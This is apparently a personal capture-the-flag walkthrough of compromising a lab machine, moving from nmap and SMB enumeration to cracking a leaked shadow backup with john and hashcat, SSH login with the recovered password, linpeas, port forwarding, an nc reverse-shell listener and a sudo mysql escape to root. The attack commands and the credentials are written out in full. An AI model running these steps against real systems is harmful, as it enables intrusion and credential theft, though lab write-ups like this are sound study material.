
nmap -sV -sC 192.168.99.130 -oN results.txt



searchsploit -m 36742     => searchspoilt ka har twe ko copy loke dar


I try to check manually to exploit service , Finally i found => site command

![[Pasted image 20230109230012.png]]


I saw smb service is running so i enuman like this 

![[Pasted image 20230110215524.png]]

I got log file here 

![[Pasted image 20230110221642.png]]

In log file , we got it here 

![[Pasted image 20230110221747.png]]

and finally we exploit it.

![[Pasted image 20230110221544.png]]

Here is our exploit

![[Pasted image 20230110221827.png]]


Here is our second exploit from this path =>  /var/backups/shadow.bak  => get from log file
![[Pasted image 20230110222223.png]]

Here is username and password !

![[Pasted image 20230110225447.png]]

Let play with fun

using john  
![[Pasted image 20230110225606.png]]


Using hashcat  =>   That's too awesome

hashcat -m 1800 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

1800  => dar ka  

![[Pasted image 20230110230152.png]]


I got it Lol!

![[Pasted image 20230110230811.png]]


=> ssh login 
username => aeolus
password => sergioteamo


---

Rooting Rootin Rooting

find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null    -> for suid  -> but see nothing 

uname -a 

cat /etc/*release  

gcc  -> for c


find / -user cronus -perm -4000 -exec ls -ldb {} \; 2>/dev/null   -> cuz we see cronus user in home 


we saw this two are comminunicate  haha

![[Pasted image 20230122230536.png]]


but we can do nothing so we use linpeas -> auto enumation tool 

i download linpeas with wget command 

and give full permission  -> chomd 777 linpeas barnyar

and then run ./linpeas

we found this one with linpeas
![[Pasted image 20230122232723.png]]

curl http://127.0.0.1:8080     => we check with this   

-> we are port forwarding  (Local  port forwarding)

ssh -L 8080:127.0.0.1:8080 aeolus@192.168.99.130

We add and run this machine with this exploit payload -> and using nc -lvp haha
![[Pasted image 20230123000916.png]]

and then check the cat config.php file we got this one

![[Pasted image 20230123001102.png]]

### Database config
$config['db_host'] = 'localhost';
$config['db_port'] = '3306';
$config['db_user'] = 'librenms';
$config['db_pass'] = 'VLby8dGg4rvw33sg';
$config['db_name'] = 'librenms';
$config['db_socket'] = '';
  
----> upper one ka har ka copy lot ya aung

we check with sudo -l

![[Pasted image 20230123001359.png]]

and then go to GTFO bin and search mysql  and then copy this one

```
sudo mysql -e '\! /bin/sh'
```

![[Pasted image 20230123001512.png]]

!!!!! Dump bro we got root

![[Pasted image 20230123001719.png]]
